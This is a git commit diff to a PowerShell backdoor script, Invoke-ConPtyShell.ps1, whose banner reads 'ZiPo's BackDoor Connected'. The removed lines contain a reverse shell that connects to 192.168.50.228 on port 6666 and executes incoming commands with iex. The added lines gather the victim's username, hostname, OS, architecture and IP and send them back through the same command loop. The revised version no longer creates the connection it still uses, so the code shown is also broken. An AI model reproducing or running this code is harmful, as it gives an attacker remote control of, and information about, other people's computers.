f0c3a8a5aebb2cb5f40765a68b0e1914d24c030b
Lev Vedrov <102747673+zipo0@users.noreply.github.com>
2025-04-09 00:30:19 +0300

    Update Invoke-ConPtyShell.ps1

--- Invoke-ConPtyShell.ps1
+++ Invoke-ConPtyShell.ps1
@@ -1,33 +1,29 @@
-$Host.UI.RawUI.ForegroundColor = "Red"
-Write-Host "
+# Сначала накапливаем инфу в $sendback
+$sendback = @"
 ███████╗██╗██████╗  ██████╗ ███████╗
 ██╔════╝██║██╔══██╗██╔════╝ ██╔════╝
 ███████╗██║██████╔╝██║  ███╗█████╗  
 ╚════██║██║██╔═══╝ ██║   ██║██╔══╝  
 ███████║██║██║     ╚██████╔╝███████╗
 ╚══════╝╚═╝╚═╝      ╚═════╝ ╚══════╝
-      ZiPo's BackDoor Connected
-" -ForegroundColor Red
+ZiPo's BackDoor Connected
 
-$Host.UI.RawUI.ForegroundColor = "Green"
+Username: $env:USERNAME
+Computer: $env:COMPUTERNAME
+OS: $([System.Environment]::OSVersion.VersionString)
+Architecture: $env:PROCESSOR_ARCHITECTURE
+IP: $((Test-Connection -ComputerName (hostname) -Count 1).IPv4Address.IPAddressToString)
 
-# Вывод базовой инфы о системе
-Write-Host "Username: $env:USERNAME"
-Write-Host "Computer: $env:COMPUTERNAME"
-Write-Host "OS: $([System.Environment]::OSVersion.VersionString)"
-Write-Host "Architecture: $env:PROCESSOR_ARCHITECTURE"
-Write-Host "IP: $((Test-Connection -ComputerName (hostname) -Count 1).IPv4Address.IPAddressToString)"
-Write-Host "`n---------------------------------------------------`n"
+---------------------------------------------------
+"@
 
-# Reverse Shell
-$client = New-Object System.Net.Sockets.TCPClient("192.168.50.228",6666);
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
+# Потом запускаем цикл и добавляем вывод команд
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
   $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-  $sendback = (iex $data 2>&1 | Out-String );
-  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
-  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+  $result = (iex $data 2>&1 | Out-String );
+  $sendback += $result + "PS " + (pwd).Path + "> ";
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);
   $stream.Write($sendbyte,0,$sendbyte.Length);
   $stream.Flush()
-};$client.Close()
+  $sendback = ""
+}
